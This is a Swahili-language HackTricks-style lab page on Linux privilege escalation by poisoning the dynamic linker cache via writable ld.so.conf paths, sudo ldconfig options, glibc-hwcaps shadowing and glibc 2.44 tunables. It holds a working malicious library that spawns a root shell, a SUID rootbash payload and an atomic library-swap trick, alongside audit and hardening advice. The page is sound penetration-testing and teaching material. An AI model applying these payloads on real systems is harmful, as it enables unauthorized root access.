# Mfano wa exploit ya ld.so privesc

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu ni lab inayolenga kufanya poisoning ya **system linker cache kupitia `/etc/ld.so.conf` au `ldconfig`**. Kwa missing-library injection, `RPATH`/`RUNPATH` inayoweza kuandikwa, `LD_PRELOAD`, na matumizi mengine mabaya ya generic SUID linker, angalia [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Andaa mazingira

Katika sehemu ifuatayo unaweza kupata code ya files tutakazotumia kuandaa mazingira.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Unda** faili hizo kwenye mashine yako katika folda hiyo hiyo
2. **Compile** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Nakili** `libcustom.so` hadi `/usr/lib` na refresh cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Compile** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Kagua mazingira

Kagua kwamba _libcustom.so_ **inapakiwa** kutoka _/usr/lib_ na kwamba unaweza **kutekeleza** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Amri muhimu za triage

Unaposhambulia target halisi, thibitisha **jina kamili la library** ambalo binary inahitaji, kile ambacho loader **inasolve kwa sasa**, na ni paths zipi zilizosanidiwa zinaweza kuandikwa bila kubadilisha live cache.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Tumia `ldd` tu kwenye executable **trusted**. Baadhi ya implementations au ELF interpreters zisizo za kawaida zinaweza kuifanya itekeleze code inayodhibitiwa na mshambuliaji; `objdump -p ./file | grep NEEDED` huorodhesha kwa usalama dependencies za moja kwa moja. Kwa target ya kuaminika, kuendesha interpreter iliyogunduliwa kwa `--list` huonyesha resolution halisi. Linganisha output hiyo na `--inhibit-cache --list`: tofauti inathibitisha kuwa `/etc/ld.so.cache`, badala ya rule ya kawaida ya search-path, ndiyo iliyochagua object.<sup>[[1]](#references)[[4]](#references)</sup>

Baadhi ya mambo muhimu ya kuzingatia:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` kwa kawaida **haifanyi kazi** kwa sababu redirection hufanywa na shell yako ya sasa. Tumia
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` badala yake.
- Binaries za **SUID/privileged** huendeshwa katika **secure-execution mode**: `LD_LIBRARY_PATH`
hupuuzwa, huku `LD_PRELOAD` ikizuiwa (majina yenye slash hupuuza, na libraries zilizo na setuid-marking pekee katika standard directories ndizo zinaweza kupreloadiwa). Mara root anapoendesha `ldconfig`, directories zilizoorodheshwa katika
`/etc/ld.so.conf` zinaweza kuingia kwenye `/etc/ld.so.cache`, hivyo misconfiguration hii bado inaweza kuathiri programs za privileged.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` pia hupuuza katika secure-execution mode isipokuwa `/etc/suid-debug` iwepo, kwa hiyo kusanya trace yake kutoka kwenye run inayolingana isiyo ya SUID badala ya kutarajia output kutoka kwenye privileged execution.<sup>[[1]](#references)</sup>
- Kwenye glibc 2.33 na mpya zaidi, dynamic loader pia hutoa
`--list-diagnostics`, ambayo huchapisha loader diagnostics zinazosomeka na mashine pamoja na built-in search-path information wakati hijack haifanyi kazi kama ilivyotarajiwa.<sup>[[1]](#references)[[6]](#references)</sup>

### Vikwazo vya Cache na SONAME

`ldconfig` hai-cache kila file holela katika directory iliyosanidiwa: huchunguza ELF headers, hutambua majina yanayolingana na `lib*.so*` au `ld-*.so*`, na hutazamia chain ya kawaida ya `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Kwa hiyo, object iliyoingizwa lazima iwe na target architecture/class, jina halisi la `DT_NEEDED` (kwa kawaida `DT_SONAME` yake), na symbols/versions zozote ambazo victim inaresolve.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Pendelea library maalum kwa target kama katika mfano huu. Kuweka object isiyokamilika yenye SONAME ya kawaida kunaweza kuvuruga kila process inayoi-resolve kabla ya target yenye privileged kuanza.<sup>[[3]](#references)</sup>

### Uendelevu wa njia iliyo kwenye cache na atomic swaps

Cache huhifadhi mapping ya jina la **library hadi pathname**; haihifadhi shared object yenyewe. Baada ya pathname inayodhibitiwa na attacker kuwekwa kwenye cache, kubadilisha object iliyo kwenye path hiyo halisi huathiri processes mpya zinazoanzishwa bila kuendesha `ldconfig` tena. Hii huwezesha mbinu muhimu ya time-of-check/time-of-use: weka library halali wakati wa rebuild au ukaguzi wa cache unaofanywa na administrator, kisha utumie atomic rename kuweka payload juu yake. Processes zilizopo huendelea kutumia object ambayo tayari imekuwa mapped.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Vivyo hivyo, kufuta mstari hasidi kutoka `ld.so.conf` hakuondoi kiotomatiki entry ambayo tayari imeandikwa: administrator lazima aondoe object isiyoaminika, arekebishe ownership/write access, na ajenge upya cache. Tumia ulinganisho wa `--inhibit-cache` hapo juu kutofautisha cache entry iliyopitwa na wakati na configuration path ambayo bado inatumika.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

Katika hali hii, tuseme administrator ameongeza entry yenye udhaifu kwenye
file iliyo chini ya `/etc/ld.so.conf.d/` ambayo imejumuishwa na mfumo wa
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Folda yenye vulnerability ni _/home/ubuntu/lib_ (ambapo tuna access ya kuandika).\
**Download na compile** code ifuatayo ndani ya path hiyo:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ikiwa unatarajia **root** (au akaunti nyingine yenye privileged) kutekeleza **binary** iliyo katika mazingira hatarishi baadaye, kwa kawaida ni bora kuacha **artifact inayomilikiwa na root** badala ya kuanzisha **interactive shell**. Kwa mfano:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Kisha, baada ya utekelezaji wenye haki za juu kutokea, unaweza kutumia `/tmp/rootbash -p`.

Sasa kwa kuwa **tumeunda library hasidi ya libcustom ndani ya** path **iliyosetiwa vibaya**, cache ya default lazima ijengwe upya kupitia uendeshaji wenye mafanikio wa privileged **`ldconfig`**. Kuwasha upya mfumo husaidia tu pale mchakato wa ndani wa kuwasha mfumo unapoiendesha; vinginevyo subiri hatua ya administrator au tumia sudo rule isiyo salama ikiwa inapatikana.<sup>[[2]](#references)</sup>

Baada ya hili kutokea, **kagua tena** mahali ambapo executable ya `sharedvuln` inapakia library ya `libcustom.so` kutoka:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kama unavyoona, **inaipakia kutoka `/home/ubuntu/lib`** na mtumiaji yeyote akiitekeleza, shell itaendeshwa:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Kumbuka kwamba katika mfano huu hatujaongeza privileges, lakini kwa kurekebisha commands zinazotekelezwa na **kusubiri root au mtumiaji mwingine mwenye privileges atekeleze vulnerable binary**, tutaweza kuongeza privileges.

### Modern `glibc-hwcaps` shadowing

Tangu glibc 2.33, loader inaweza kupendelea libraries zilizoboreshwa zilizo chini ya `glibc-hwcaps/<level>/` ndani ya **kila library search directory**. Kwa hiyo, kuangalia `/home/ubuntu/lib` pekee hakutoshi: subdirectory inayoweza kuandikwa kama `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` inaweza kufanya shadowing ya base library baada ya `ldconfig` kui-index, huku CPUs nyingine zikiendelea kutumia base object. Hii pia hutoa hijack inayochagua architecture, ambayo inaweza kukosekana validation inapofanywa kwenye CPU tofauti.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Mwongozo wa sasa wa glibc hardening unapendekeza kuepuka SONAMEs zinazorudiwa, search locations zisizo za default, na objects zilizo katika subdirectories za `glibc-hwcaps`. Kwa mtazamo wa audit, tumia ukaguzi wa ownership na writeability recursively kwenye directories zilizosanidiwa pamoja na path components zake za parent.<sup>[[3]](#references)</sup>

### Misanidi mingine - Vuln ileile

Katika mfano uliotangulia, tulighushi misconfiguration ambapo administrator **aliweka folder isiyo na privileged ndani ya configuration file iliyo ndani ya `/etc/ld.so.conf.d/`**.\
Lakini kuna misconfiguration nyingine zinazoweza kusababisha vulnerability ileile: ikiwa una **write permissions** kwenye **config file** iliyopakiwa, unaweza kuunda file katika directory ya `/etc/ld.so.conf.d/` inayoweza kuandikwa, au unaweza kuandika kwenye `/etc/ld.so.conf`, unaweza kusanidi na kutumia vulnerability ileile.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Tuseme una sudo privileges juu ya `ldconfig`**. `ldconfig` inakubali scan directories kama positional arguments, kwa hivyo njia fupi zaidi ya cache-poisoning mara nyingi huwa:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Vinginevyo, `-f` huchagua faili nyingine ya usanidi huku ikihifadhi matokeo chaguo-msingi ya akiba. Hii ni muhimu wakati kichujio cha hoja kinapozuia saraka za positional lakini bado kinaruhusu `-f`, au wakati njia kadhaa zinahitaji kuingizwa:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sasa, kama ilivyoonyeshwa katika **previous exploit**, **unda library hasidi ndani ya `/tmp`**.\
Na mwisho, hebu pakia path na uangalie binary inapakia library kutoka wapi:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kama unavyoona, ukiwa na sudo privileges juu ya `ldconfig` unaweza kutumia vulnerability hiyo hiyo.** Maelezo ya options ni muhimu unapokagua sudo rule yenye vizuizi: `-f` huchagua configuration nyingine lakini bado huunda upya `/etc/ld.so.cache`; `-C` huelekeza cache mahali pengine; `-N` huzuia cache kujengwa upya; na `-X` huzuia kusasishwa kwa links lakini **bado huunda upya cache isipokuwa itumike pamoja na `-N`**. `-n` humaanisha `-N`, hivyo inaweza kusasisha links katika directories zilizotolewa lakini haiwezi kuathiri cache; `-r` hufanya kazi chini ya root mbadala na kwa kawaida haibadilishi cache ya host.<sup>[[2]](#references)</sup>

### glibc 2.44: kusakinisha cache iliyotengenezwa awali

Glibc 2.44 iliongeza `ldconfig --install SOURCE`, ambayo hunakili cache iliyotengenezwa awali kwa njia ya atomic kwenye destination iliyochaguliwa ya cache (host `/etc/ld.so.cache` isipokuwa `-C` au `-r` ibadilishe). Hii huunda argument nyingine hatari kwa sudoers rules na privileged wrappers: mshambuliaji anaweza kutengeneza cache halali **bila privileges**, kisha kutumia invocation iliyoruhusiwa ya `--install` kubadilisha system cache. Install path hukagua cache magic lakini haitengenezi upya entries zake kutoka kwenye configuration inayoaminika.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Cache bado ina **pathnames**, si bytes za library, kwa hivyo `/tmp/libcustom.so` lazima ibaki kuwepo na iendane wakati victim anapoanzisha programu. Kwa hiyo, filters zinazokataa tu `-f`, directories za positional, au `-t` hazitoshi kwenye glibc 2.44: kataa pia `--install`/`-I`, au ikiwezekana usikabidhi `ldconfig` kabisa.<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: tunables za mfumo mzima zilizohifadhiwa kwenye cache

Kuanzia glibc 2.44, `ldconfig` pia huchanganua `/etc/tunables.conf` na kuhifadhi settings zake kama extension ndani ya `/etc/ld.so.cache`. File hii inakubali directives za `include` na filters za kila process. Prefixes hudhibiti scope: `@`/`onlysecure` hulenga processes za `AT_SECURE` pekee, `$`/`nonsecure` huziondoa, na `*`/`anysecure` hujumuisha zote mbili. **Entry isiyo na prefix, kwa default, hulenga processes zisizo secure**, kwa hivyo attacker lazima atumie waziwazi `@` au `*` ili kuathiri programu za setuid, setgid, au zilizopewa capabilities. Hii inapanua mpaka wa audit zaidi ya directories za library: configuration ya tunables inayoweza kuandikwa au file iliyojumuishwa inaweza kuathiri uanzishaji wa programu za baadaye baada ya privileged cache rebuild.<sup>[[7]](#references)[[9]](#references)</sup>

Release hiyo hiyo inaongeza `ldconfig -t TUNCONF`, inayochagua file mbadala ya tunables huku ikiendelea kuandika cache ya kawaida isipokuwa option nyingine ibadilishe hilo. Kwa hiyo, wrappers na sudo rules zilizojaribu kuzuia `-f` pekee lazima pia zikatae `-t`, directories za positional zisizo arbitrary, `--install`, na manipulation ya cache-output.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### Vigezo vinavyolenga target

Kichujio cha `[proc:PATTERN]` hutumia entries zifuatazo tu wakati path kamili ya `/proc/self/exe` ya executable (ikiwa `PATTERN` inaanza na `/`) au basename inalingana. Kichujio huishia kwenye kichujio kinachofuata, `[]`, mwisho wa file, au mpaka wa include-file. Hii hufanya cache iliyotiwa sumu isiwe na kelele nyingi, kwa sababu tabia iliyobadilishwa inaweza kuzuiwa kwa victim mmoja mwenye privileges.<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
Kiambishi awali cha `-`/`nonoverridable` huzuia `GLIBC_TUNABLES` kubatilisha thamani iliyohifadhiwa kwenye cache; `+`/`overridable` hurejesha tabia ya kawaida ya kubatilisha. Kwa michakato ya `AT_SECURE`, environment variable hiyo hupuuzwa kabisa. Chukulia muundo wa faili kuwa maalum kwa kila version—mradi wa glibc hauahidi kuwa ni interface thabiti—na orodhesha majina na thamani zinazotumika kwa `"$interp" --list-tunables` kabla ya kujaribu athari inayolengwa.<sup>[[7]](#references)[[9]](#references)</sup>

Hii si utekelezaji wa arbitrary code kiotomatiki. Ni primitive ya upendeleo ya **loader-behavior manipulation**: glibc inaonya wazi kwamba thamani za mfumo mzima zinaweza kutumia tunables nyeti kwa usalama kwenye programu za setuid/setgid bila ukaguzi wa usalama wa kila tunable. Tafuta mabadiliko ya allocator yanayolenga target, mabadiliko ya CPU-hardening, au hali za denial-of-service badala ya kudhani kuwa kuna payload ya jumla.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [The GNU C Library version 2.44 is now available](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [glibc 2.44 ldconfig source](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
